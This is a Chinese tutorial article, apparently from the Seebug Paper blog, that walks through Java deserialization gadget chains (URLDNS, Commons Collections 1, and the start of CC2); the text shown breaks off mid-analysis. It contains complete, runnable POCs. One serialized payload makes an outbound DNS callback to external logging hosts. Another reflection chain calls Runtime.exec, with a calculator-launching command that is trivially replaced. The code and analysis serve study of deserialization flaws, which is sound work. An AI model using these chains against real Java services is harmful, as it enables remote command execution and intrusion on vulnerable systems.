**作者：p1g3@D0g3**  
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！**  
**投稿邮箱：paper@seebug.org**

本篇将以URLDNS以及Commons Collections系列漏洞作为Java反序列化基础篇的练习，仅以巩固对反序列化这类漏洞的理解。

目前已经有很多java反序列化的学习文章供我们学习，所以我算是站在巨人的肩膀上完成了这篇文章，如果有什么错误的地方，欢迎指正，感谢。

下文将以yso代替ysoserial，以cc代替Commons
Collections进行分析。ysoserial的payload可以通过访问[payloads](https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads)获得。

以下描述的链中涉及到的class均实现了Serializable，所以均可被反序列化，这点将不再提及。

# URLDNS

URLDNS是反序列化时经常会用到的链，通常用于快速检测是否存在反序列化漏洞，原因如下：

  * 只依赖原生类
  * 不限制jdk版本

测试环境：jdk 8u131

## 利用链

    
    
     *     HashMap.readObject()
     *       HashMap.putVal()
     *         HashMap.hash()
     *           URL.hashCode()

## 利用链分析

urldns是yso中较为简单的一个gadget，所以这里可以直接通过正向分析的方式进行分析。

HashMap#readObject：

    
    
    private void readObject(java.io.ObjectInputStream s)
            throws IOException, ClassNotFoundException {
            // Read in the threshold (ignored), loadfactor, and any hidden stuff
            s.defaultReadObject();
            reinitialize();
            if (loadFactor <= 0 || Float.isNaN(loadFactor))
                throw new InvalidObjectException("Illegal load factor: " +
                                                 loadFactor);
            s.readInt();                // Read and ignore number of buckets
            int mappings = s.readInt(); // Read number of mappings (size)
            if (mappings < 0)
                throw new InvalidObjectException("Illegal mappings count: " +
                                                 mappings);
            else if (mappings > 0) { // (if zero, use defaults)
                // Size the table using given load factor only if within
                // range of 0.25...4.0
                float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
                float fc = (float)mappings / lf + 1.0f;
                int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                           DEFAULT_INITIAL_CAPACITY :
                           (fc >= MAXIMUM_CAPACITY) ?
                           MAXIMUM_CAPACITY :
                           tableSizeFor((int)fc));
                float ft = (float)cap * lf;
                threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                             (int)ft : Integer.MAX_VALUE);
                @SuppressWarnings({"rawtypes","unchecked"})
                    Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
                table = tab;
    
                // Read the keys and values, and put the mappings in the HashMap
                for (int i = 0; i < mappings; i++) {
                    @SuppressWarnings("unchecked")
                        K key = (K) s.readObject();
                    @SuppressWarnings("unchecked")
                        V value = (V) s.readObject();
                    putVal(hash(key), key, value, false, false);
                }
            }
        }

上面的这些前面一大段暂时先忽略，重点关注putVal这一段，这里调用了hash方法来处理key，跟进hash方法：

    
    
        static final int hash(Object key) {
            int h;
            return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
        }

这里调用了key.hashCode方法，让我们看看URL的hashCode方法：

URL#hashCode：

    
    
        public synchronized int hashCode() {
            if (hashCode != -1)
                return hashCode;
    
            hashCode = handler.hashCode(this);
            return hashCode;
        }

在URL类的hashCode方法中，又调用了URLStreamHandler#hashCode，并将自身传递进去：

URLStreamHandler#hashCode

    
    
    protected int hashCode(URL u) {
            int h = 0;
    
            // Generate the protocol part.
            String protocol = u.getProtocol();
            if (protocol != null)
                h += protocol.hashCode();
    
            // Generate the host part.
            InetAddress addr = getHostAddress(u);

重点关注这里的getHostAddress，正是这步触发了dns请求：

![-w618](https://images.seebug.org/content/images/2020/06/11/1591853418000-1quxiu.png-w331s)

回到第一步：HashMap#readObject

![-w559](https://images.seebug.org/content/images/2020/06/11/1591853419000-2nvvww.png-w331s)

key是使用readObject取出来的，也就是说在writeObject一定会写入key：

    
    
        private void writeObject(java.io.ObjectOutputStream s)
            throws IOException {
            int buckets = capacity();
            // Write out the threshold, loadfactor, and any hidden stuff
            s.defaultWriteObject();
            s.writeInt(buckets);
            s.writeInt(size);
            internalWriteEntries(s);
        }

跟入internalWriteEntries：

    
    
        void internalWriteEntries(java.io.ObjectOutputStream s) throws IOException {
            Node<K,V>[] tab;
            if (size > 0 && (tab = table) != null) {
                for (int i = 0; i < tab.length; ++i) {
                    for (Node<K,V> e = tab[i]; e != null; e = e.next) {
                        s.writeObject(e.key);
                        s.writeObject(e.value);
                    }
                }
            }
        }

不难发现，这里的key以及value是从tab中取的，而tab的值即HashMap中table的值。

此时我们如果想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以在这里就会产生第一次dns查询：

HashMap#put：

    
    
        public V put(K key, V value) {
            return putVal(hash(key), key, value, false, true);
        }
    
    
    import java.util.HashMap;
    import java.net.URL;
    
    public class Test {
    
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://urldns.4ac35f51205046ab.dnslog.cc/");
            map.put(url,123); //此时会产生dns查询
        }
    
    }

我们只想判断payload在对方机器上是否成功触发，那该怎么避免掉这一次dns查询，回到URL#hashCode：

    
    
        public synchronized int hashCode() {
            if (hashCode != -1)
                return hashCode;
    
            hashCode = handler.hashCode(this);
            return hashCode;
        }

这里会先判断hashCode是否为-1，如果不为-1则直接返回hashCode，也就是说我们只要在put前修改URL的hashCode为其他任意值，就可以在put时不触发dns查询。

![-w476](https://images.seebug.org/content/images/2020/06/11/1591853419000-3grjpg.png-w331s)

这里的hashCode是private修饰的，所以我们需要通过反射来修改其值。

    
    
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.net.URL;
    
    public class Test {
    
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://urldns.4ac35f51205046ab.dnslog.cc/");
            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true); //修改访问权限
            f.set(url,123); //设置hashCode值为123，这里可以是任何不为-1的数字
            System.out.println(url.hashCode()); // 获取hashCode的值，验证是否修改成功
            map.put(url,123); //调用map.put 此时将不会再触发dns查询
        }
    
    }

此时输出url的hashCode为123，证明修改成功。当put完毕之后再将url的hashCode修改为-1，确保在反序列化调用hashCode方法时能够正常进行，下面是完整的POC：

    
    
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.net.URL;
    
    public class Test {
    
        public static void main(String[] args) throws Exception {
            HashMap map = new HashMap();
            URL url = new URL("http://urldns1.eakcmc.ceye.io/");
            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true); // 修改访问权限
            f.set(url,123); // 设置hashCode值为123，这里可以是任何不为-1的数字
            System.out.println(url.hashCode()); // 获取hashCode的值，验证是否修改成功
            map.put(url,123); // 调用map.put 此时将不会再触发dns查询
            f.set(url,-1); // 将url的hashCode重新设置为-1。确保在反序列化时能够成功触发
    
            try{
                FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
                ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
                outputStream.writeObject(map);
                outputStream.close();
                fileOutputStream.close();
    
                FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
                ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
                inputStream.readObject();
                inputStream.close();
                fileInputStream.close();
            }catch(Exception e){
                e.printStackTrace();
            }
    
        }
    
    }

回过头来看看yso的payload：

    
    
            public Object getObject(final String url) throws Exception {
    
                    //Avoid DNS resolution during payload creation
                    //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                    URLStreamHandler handler = new SilentURLStreamHandler();
    
                    HashMap ht = new HashMap(); // HashMap that will contain the URL
                    URL u = new URL(null, url, handler); // URL to use as the Key
                    ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
    
                    Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
    
                    return ht;
            }

yso在创建URL对象时使用了三个参数的构造方法。这里比较有意思的是，yso用了子类继承父类的方式规避了dns查询的风险，其创建了一个内部类：

    
    
    static class SilentURLStreamHandler extends URLStreamHandler {
    
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }
    
            protected synchronized InetAddress getHostAddress(URL u) {
                return null;
            }
        }

定义了一个URLConnection和getHostAddress方法，当调用put方法走到getHostAddress方法后，会调用SilentURLStreamHandler的getHostAddress而非URLStreamHandler的getHostAddress，这里直接return
null了，所以自然也就不会产生dns查询。

那么为什么在反序列化时又可以产生dns查询了呢？是因为这里的handler属性被设置为transient，前面说了被transient修饰的变量无法被序列化，所以最终反序列化读取出来的transient依旧是其初始值，也就是URLStreamHandler。

这也就解释了为什么反序列化后获取的handler并不是前面设置的SilentURLStreamHandler了。

两种方法都可以规避在put时造成的dns查询，前者比较简单且思路清晰，后者比较麻烦但同时也比较炫一些。当然，这里也可以直接不用HashMap#put方法来设置table，可以通过反射的方式来设置table，但是相对而言十分麻烦，所以并没有使用。

最终。我认为yso中写的利用链并不详细，我认为的利用链应该是这样的：

    
    
    HashMap#readObject
        HashMap#hash
            URL#hashCode
            URLStreamHandler#hashCode
            URLStreamHandler#getHostAddress

在JDK7中也是一样的，HashMap#readObject中最后调的方法改了一下：

![-w502](https://images.seebug.org/content/images/2020/06/11/1591853419000-4wffec.png-w331s)

但是实际上还是会触发hash方法：

![-w485](https://images.seebug.org/content/images/2020/06/11/1591853419000-5pbswa.png-w331s)

最终还是会调用到URL#hashCode：

![-w554](https://images.seebug.org/content/images/2020/06/11/1591853419000-6zpimd.png-w331s)

# Commons Collections

Apache
Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。

Commons Collections包为Java标准的Collections
API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。

由于大量的生产环境中都会导入这个包，所以此包中的众多反序列化链已经成为经典链条，本篇将对cc1-7的链进行梳理和总结，以加深对java反序列化的理解。

## 环境搭建

在这里统一使用maven来导包，比较方便也比较快捷。

先按照网上的安装和配置好maven（创建本地仓库和选择远程仓库等），接着使用idea->create new project->maven。

之后要导包的话修改pom.xml即可，比如我这里要导一个cc3.1，只需要添加以下内容：

    
    
     <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
      </dependencies>

之后右侧会出现一个类似的更新按钮：

![-w973](https://images.seebug.org/content/images/2020/06/11/1591853419000-7bedqo.png-w331s)

点击后即可实现自动导包，十分方便和快捷。导包完成之后左侧就可以看到成功导入的包了：

![-w1440](https://images.seebug.org/content/images/2020/06/11/1591853420000-8bgsqo.png-w331s)

如果要修改jdk的话，需要改两个点，一个是编译用的jdk，一个是导包用的jdk。

第一个点可以在这里修改，首先新建一个maven的编译环境：

![-w1071](https://images.seebug.org/content/images/2020/06/11/1591853420000-9vhgsd.png-w331s)

之后改jdk可以在runner这里改：

![-w736](https://images.seebug.org/content/images/2020/06/11/1591853420000-10smyju.png-w331s)

第二个导包的jdk可以从File->Project Structure->Modules->Dependencies这里修改：

![-w532](https://images.seebug.org/content/images/2020/06/11/1591853421000-11rigqb.png-w331s)

## CommonsCollections 1

测试环境：

  * JDK 1.7
  * Commons Collections 3.1

### 利用链

    
    
    ObjectInputStream.readObject()
                AnnotationInvocationHandler.readObject()
                    Map(Proxy).entrySet()
                        AnnotationInvocationHandler.invoke()
                            LazyMap.get()
                                ChainedTransformer.transform()
                                    ConstantTransformer.transform()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Class.getMethod()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.getRuntime()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.exec()

### 动态代理

在cc1的前半部分链中用到了这里的知识，记录一下。

举一个简单的例子，供货商发货给超市，我们去超市买东西。

此时超市就相当于一个代理，我们可以直接去供货商买东西，但没多少人会这么做。

在Java中的代理模式也是一样，我们需要定义一个接口，这个接口不可以直接被实例化，需要通过类去实现这个接口，才可以实现对这个接口中方法的调用。

而动态代理实现了不需要中间商（类），直接“创建”某个接口的实例，对其方法进行调用。

当我们调用某个动态代理对象的方法时，都会触发代理类的invoke方法，并传递对应的内容。

Demo：

    
    
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Method;
    import java.lang.reflect.Proxy;
    
    public class Test {
        public static void main(String[] args){
                InvocationHandler handler = new InvocationHandler() {
                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                        System.out.println(method);
                        if (method.getName().equals("morning")) {
                            System.out.println("Good morning, " + args[0]);
                        }
                        return null;
                    }
                };
    
                Hello hello = (Hello)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Hello.class},handler);
                hello.morning("liming");
    
    
    
        }
    }

Hello.java：

    
    
    public interface Hello {
        void morning(String name);
    }

这里首先定义了一个handler，通过其实现对某个类接口的调用。

接着定义了一个代理对象Hello，需要传递三个参数分别为ClassLoader、要代理的接口数组以及调用接口时触发的对应方法。

此时我调用hello.morning,就会触发handler的invoke方法，并传递三个参数进去，分别为proxy即代理对象，method即调用的方法的Method对象，args即传递的参数。

所有的handler都需要实现InvocationHandler这个接口，并实现其invoke方法来实现对接口的调用。

### 利用链分析

先对后半段链进行分析。在commons
collections中有一个Transformer接口，其中包含一个transform方法，通过实现此接口来达到类型转换的目的。

![-w581](https://images.seebug.org/content/images/2020/06/11/1591853421000-12jssqb.png-w331s)

其中有众多类实现了此接口，cc中主要利用到了以下三个。

  * InvokerTransformer

其transform方法实现了通过反射来调用某方法：

![-w885](https://images.seebug.org/content/images/2020/06/11/1591853421000-13feoti.png-w331s)

  * ConstantTransformer

其transform方法将输入原封不动的返回：

![-w1003](https://images.seebug.org/content/images/2020/06/11/1591853421000-14oggec.png-w331s)

  * ChainedTransformer

其transform方法实现了对每个传入的transformer都调用其transform方法，并将结果作为下一次的输入传递进去：

![-w634](https://images.seebug.org/content/images/2020/06/11/1591853421000-15mthsd.png-w331s)

![-w855](https://images.seebug.org/content/images/2020/06/11/1591853422000-16loccn.png-w331s)

由这三个transformer组合起来，即可实现任意命令执行：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.*;
    
    public class cc1 {
    
         public static void main(String[] args){
              ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                      new ConstantTransformer(Runtime.class),
                      new InvokerTransformer("getMethod", new Class[] {
                              String.class, Class[].class }, new Object[] {
                              "getRuntime", new Class[0] }),
                      new InvokerTransformer("invoke", new Class[] {
                              Object.class, Object[].class }, new Object[] {
                              null, new Object[0] }),
                      new InvokerTransformer("exec",
                              new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
              chain.transform(123);
         }
    }

先说下这个反射链是如何构成的，先看InvokerTransformer的transform方法：

    
    
        public Object transform(Object input) {
            if (input == null) {
                return null;
            } else {
                try {
                    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);

这里接收了一个Object，并调用这个Object方法，方法名、方法所需要的参数类型、方法所需要的参数这三个都是我们可以控制的。

所以我们可以直接通过这里来命令执行：

    
    
    Runtime runtime = Runtime.getRuntime();
    Transformer invoketransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open  /System/Applications/Calculator.app"});
    invoketransformer.transform(runtime);

这就需要一个条件，在调用transform方法的时候，需要传递一个Runtime.getRuntime()，这几乎是不可能的，没有人会在反序列化后调用transform方法还传递一个Runtime的实例进去。我们需要把攻击所需要的条件尽可能的缩小，实现在反序列化时就能够rce，所以需要想办法把传递Runtime.getRuntime()这一条件给去掉。接着就找到了ConstantTransformer这个类。

上面说了，其transform方法是将输入的Object原封不动的返回回去，那么我们是不是可以尝试这么搭配：

    
    
    Object constantTransformer = new ConstantTransformer(Runtime.getRuntime()).transform(123);
    Transformer invoketransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open  /System/Applications/Calculator.app"});
    invoketransformer.transform(constantTransformer);

上述代码搭配ChainedTransformer是这样的：

    
    
         public void test(){
              ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                      new ConstantTransformer(Runtime.getRuntime()),
                      new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open  /System/Applications/Calculator.app"})
    
              });
              chain.transform(123);
         }

此时只要ChainedTransformer反序列化后调用transform方法并传递任意内容即可实现rce，但是当尝试去序列化的时候，发生了一个问题：

![-w941](https://images.seebug.org/content/images/2020/06/11/1591853422000-17ehvtd.png-w331s)

因为这里的Runtime.getRuntime()返回的是一个Runtime的实例，而Runtime并没有继承Serializable，所以这里会序列化失败。

那么我们就需要找到一个方法来获取到Runtime.getRuntime()返回的结果，并将其传入invoketransformer的transform方法中。这就有了上边那条链。

![-w874](https://images.seebug.org/content/images/2020/06/11/1591853422000-18nesqb.png-w331s)

这里通过InvokerTransformer来实现了一次反射，即通过反射来反射，先是调用getMethod方法获取了getRuntime这个Method对象，接着又通过Invoke获取getRuntime的执行结果。

这里我一开始看Class[].class以及new
Class[0]十分懵逼，不明白到底是为什么，后边经过几位师傅的指导终于理解了。我们这里尝试通过反射去调用getMethod方法，而getMethod的定义如下：

![-w903](https://images.seebug.org/content/images/2020/06/11/1591853422000-19zfqon.png-w331s)

这里需要传入一个name也就是要调用的方法名，接着需要传递一个可变参数，所以这里的Class[].class，其实就是对应着这里的可变参数，即使我们不需要传递参数，也需要在这里加一个Class[].class，后边再加一个new
Class[0]起到占位的作用。

梳理一下现在已经构造好的链：

    
    
              ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                      new ConstantTransformer(Runtime.class),
                      new InvokerTransformer("getMethod", new Class[] {
                              String.class, Class[].class }, new Object[] {
                              "getRuntime", new Class[0] }),
                      new InvokerTransformer("invoke", new Class[] {
                              Object.class, Object[].class }, new Object[] {
                              null, new Object[0] }),
                      new InvokerTransformer("exec",
                              new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
              chain.transform(123);

目前已经构造到只需要反序列化后调用transform方法，并传递任意内容即可rce。我们的目的是在调用readObject的时候就触发rce，也就是说我们现在需要找到一个点调用了transform方法（如果能找到在readObject后就调用那是最好的），如果找不到在readObject里调用transform方法，那么就需要找到一条链，在readObject触发起点，接着一步步调用到了transform方法。

cc1里用的是Lazymap#get这个方法：

![-w611](https://images.seebug.org/content/images/2020/06/11/1591853423000-20dtqxr.png-w331s)

如果这里的this.factory可控，那么我们就可以通过LazyMap来延长我们的链，下一步就是找哪里调用了get方法了。

    
    
    protected final Transformer factory;

这里的factory并没有被transient以及static关键字修饰，所以是我们可控的，并且由于factory是在类初始化时定义的，所以我们可以通过创建LazyMap实例的方式来设置他的值。

![-w652](https://images.seebug.org/content/images/2020/06/11/1591853423000-21embjd.png-w331s)

但是这里的构造方法并不是public的，所以需要通过反射的方式来获取到这个构造方法，再创建其实例。

    
    
         public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {
              ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                      new ConstantTransformer(Runtime.class),
                      new InvokerTransformer("getMethod", new Class[] {
                              String.class, Class[].class }, new Object[] {
                              "getRuntime", new Class[0] }),
                      new InvokerTransformer("invoke", new Class[] {
                              Object.class, Object[].class }, new Object[] {
                              null, new Object[0] }),
                      new InvokerTransformer("exec",
                              new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
              HashMap innermap = new HashMap();
              Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
              Constructor[] constructors = clazz.getDeclaredConstructors();
              Constructor constructor = constructors[0];
              constructor.setAccessible(true);
              LazyMap map = (LazyMap)constructor.newInstance(innermap,chain);
              map.get(123);
         }

接着我们需要找到某个地方调用了get方法，并且传递了任意值。通过学习了上边动态代理的知识，我们可以开始分析cc1的前半段链了。

入口时AnnotationInvocationHandler的readObject：

![-w838](https://images.seebug.org/content/images/2020/06/11/1591853423000-22ukmwf.png-w331s)

这里的readObject又调用了this.memberValues的entrySet方法。如果这里的memberValues是个代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）。

    
    
    public Object invoke(Object var1, Method var2, Object[] var3) {
            String var4 = var2.getName();
            Class[] var5 = var2.getParameterTypes();
            if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
                return this.equalsImpl(var3[0]);
            } else if (var5.length != 0) {
                throw new AssertionError("Too many parameters for an annotation method");
            } else {
                byte var7 = -1;
                switch(var4.hashCode()) {
                case -1776922004:
                    if (var4.equals("toString")) {
                        var7 = 0;
                    }
                    break;
                case 147696667:
                    if (var4.equals("hashCode")) {
                        var7 = 1;
                    }
                    break;
                case 1444986633:
                    if (var4.equals("annotationType")) {
                        var7 = 2;
                    }
                }
    
                switch(var7) {
                case 0:
                    return this.toStringImpl();
                case 1:
                    return this.hashCodeImpl();
                case 2:
                    return this.type;
                default:
                    Object var6 = this.memberValues.get(var4);

这里对this.memberValues调用了get方法，如果此时this.memberValues为我们的map，那么就会触发LazyMap#get，从而完成触发rce。

完整POC：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.*;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.commons.collections.map.PredicatedMap;
    
    
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.*;
    import java.util.HashMap;
    import java.util.Map;
    
    public class cc1 {
    
         public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {
              ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                      new ConstantTransformer(Runtime.class),
                      new InvokerTransformer("getMethod", new Class[] {
                              String.class, Class[].class }, new Object[] {
                              "getRuntime", new Class[0] }),
                      new InvokerTransformer("invoke", new Class[] {
                              Object.class, Object[].class }, new Object[] {
                              null, new Object[0] }),
                      new InvokerTransformer("exec",
                              new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
              HashMap innermap = new HashMap();
              Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
              Constructor[] constructors = clazz.getDeclaredConstructors();
              Constructor constructor = constructors[0];
              constructor.setAccessible(true);
              Map map = (Map)constructor.newInstance(innermap,chain);
    
    
              Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
              handler_constructor.setAccessible(true);
              InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
    
              Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
    
    
              Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
              AnnotationInvocationHandler_Constructor.setAccessible(true);
              InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
    
              try{
                   ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc1"));
                   outputStream.writeObject(handler);
                   outputStream.close();
    
                   ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc1"));
                   inputStream.readObject();
              }catch(Exception e){
                   e.printStackTrace();
              }
    
         }
    }

分析一下利用过程：

在readObject时，会触发AnnotationInvocationHandler#readObject方法：

![-w844](https://images.seebug.org/content/images/2020/06/11/1591853424000-23zvojq.png-w331s)

此时调用了this.memberValues.entrySet，而this.memberValues是之前构造好的proxy_map，由于这是一个代理对象，所以调用其方法时，会去调用其创建代理时设置的handler的invoke方法。

![-w853](https://images.seebug.org/content/images/2020/06/11/1591853424000-24mjgvb.png-w331s)

这个proxy_map设置的handler为这个map_handler,同样是InvocationHandler这个类，接着会调用他的invoke方法：

![-w705](https://images.seebug.org/content/images/2020/06/11/1591853424000-25bavdk.png-w331s)

InvocationHandler#invoke的78行代码中调用了this.memberValues#get，此时的this.memberValues为之前设置好的lazymap，所以这里调用的是lazymap#get，从而触发后边的rce链。

这里还是比较绕的，因为设置了两个handler，但是第一个handler是为了触发lazymap#get，而第二个handler实际上只是为了触发代理类所设置handler的invoke方法。

接着解释一些细节的问题：

1.为什么这里要用反射的方式来创建AnnotationInvocationHandler的实例?

因为AnnotationInvocationHandler并不是public类，所以无法直接通过new的方式来创建其实例。

![-w929](https://images.seebug.org/content/images/2020/06/11/1591853424000-26sujor.png-w331s)

2.为什么创建其实例时传入的第一个参数是Override.class?

因为在创建实例的时候对传入的第一个参数调用了isAnnotation方法来判断其是否为注解类：

![-w929](https://images.seebug.org/content/images/2020/06/11/1591853424000-27cioyg.png-w331s)

    
    
        public boolean isAnnotation() {
            return (getModifiers() & ANNOTATION) != 0;
        }

而Override.class正是java自带的一个注解类：

![-w989](https://images.seebug.org/content/images/2020/06/11/1591853425000-28wyvzn.png-w331s)

所以这里可以直接用上，当然要是换成其他注解类也是ok的。

### 后话

创建lazymap那里其实并不需要用到反射，因为lazymap自带了一个方法来帮助我们创建其实例：

![-w896](https://images.seebug.org/content/images/2020/06/11/1591853425000-29dszga.png-w331s)

所以把上述通过反射来创建LazyMap的实例代码改为如下，也是可以成功的：

    
    
      HashMap innermap = new HashMap();
      LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);

## CommonsCollections 2

测试环境：

  * JDK 1.7
  * Commons Collections 4.0
  * javassit

maven：

    
    
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.0</version>
    </dependency>
    <dependency>
        <groupId>org.javassist</groupId>
        <artifactId>javassist</artifactId>
        <version>3.25.0-GA</version>
    </dependency>

### 利用链

    
    
            ObjectInputStream.readObject()
                PriorityQueue.readObject()
                    ...
                        TransformingComparator.compare()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

### javassit

cc2中用到了这块知识，在这里记录一下。

导包：

    
    
    <dependency>
      <groupId>org.javassist</groupId>
      <artifactId>javassist</artifactId>
      <version>3.25.0-GA</version>
    </dependency>

.java文件需要编译成.class文件后才能正常运行，而javassit是用于对生成的class文件进行修改，或以完全手动的方式，生成一个class文件。

Demo:

    
    
    import javassist.*;
    
    public class javassit_test {
        public static void createPseson() throws Exception {
            ClassPool pool = ClassPool.getDefault();
    
            // 1. 创建一个空类
            CtClass cc = pool.makeClass("Person");
    
            // 2. 新增一个字段 private String name;
            // 字段名为name
            CtField param = new CtField(pool.get("java.lang.String"), "name", cc);
            // 访问级别是 private
            param.setModifiers(Modifier.PRIVATE);
            // 初始值是 "xiaoming"
            cc.addField(param, CtField.Initializer.constant("xiaoming"));
    
            // 3. 生成 getter、setter 方法
            cc.addMethod(CtNewMethod.setter("setName", param));
            cc.addMethod(CtNewMethod.getter("getName", param));
    
            // 4. 添加无参的构造函数
            CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
            cons.setBody("{name = \"xiaohong\";}");
            cc.addConstructor(cons);
    
            // 5. 添加有参的构造函数
            cons = new CtConstructor(new CtClass[]{pool.get("java.lang.String")}, cc);
            // $0=this / $1,$2,$3... 代表方法参数
            cons.setBody("{$0.name = $1;}");
            cc.addConstructor(cons);
    
            // 6. 创建一个名为printName方法，无参数，无返回值，输出name值
            CtMethod ctMethod = new CtMethod(CtClass.voidType, "printName", new CtClass[]{}, cc);
            ctMethod.setModifiers(Modifier.PUBLIC);
            ctMethod.setBody("{System.out.println(name);}");
            cc.addMethod(ctMethod);
    
            //这里会将这个创建的类对象编译为.class文件
            cc.writeFile("./");
        }
    
        public static void main(String[] args) {
            try {
                createPseson();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

上面的代码生成的class文件是这样的：

![-w591](https://images.seebug.org/content/images/2020/06/11/1591853425000-30yynnp.png-w331s)

通过代码结合生成的class来理解就好了，十分简单。

### 利用链分析

后半段链和cc1差不多，所以这里可以正向分析，从readObject来学习整条链。

PriorityQueue#readObject：

    
    
        private void readObject(java.io.ObjectInputStream s)
            throws java.io.IOException, ClassNotFoundException {
            // Read in size, and any hidden stuff
            s.defaultReadObject();
    
            // Read in (and discard) array length
            s.readInt();
    
            queue = new Object[size];
    
            // Read in all elements.
            for (int i = 0; i < size; i++)
                queue[i] = s.readObject();
    
            // Elements are guaranteed to be in "proper order", but the
            // spec has never explained what that might be.
            heapify();
        }

这里的queue[i]的值是由readObject得到的，也就是说在writeObject处写入了对应的内容：

    
    
        private void writeObject(java.io.ObjectOutputStream s)
            throws java.io.IOException{
            // Write out element count, and any hidden stuff
            s.defaultWriteObject();
    
            // Write out array length, for compatibility with 1.5 version
            s.writeInt(Math.max(2, size + 1));
    
            // Write out all elements in the "proper order".
            for (int i = 0; i < size; i++)
                s.writeObject(queue[i]);
        }

也就是说我们可以通过反射来设置queue[i]的值来达到控制queue[i]内容的目的。

在readObject处调用了heapify：

这里的queue[i]是我们可控的。

    
    
        private void heapify() {
            for (int i = (size >>> 1) - 1; i >= 0; i--)
                siftDown(i, (E) queue[i]);
        }

siftDown：

    
    
        private void siftDown(int k, E x) {
            if (comparator != null)
                siftDownUsingComparator(k, x);
            else
                siftDownComparable(k, x);
        }

这里的x是我们可控的，跟入第一个siftDownUsingComparator：

    
    
        private void siftDownUsingComparator(int k, E x) {
            int half = size >>> 1;
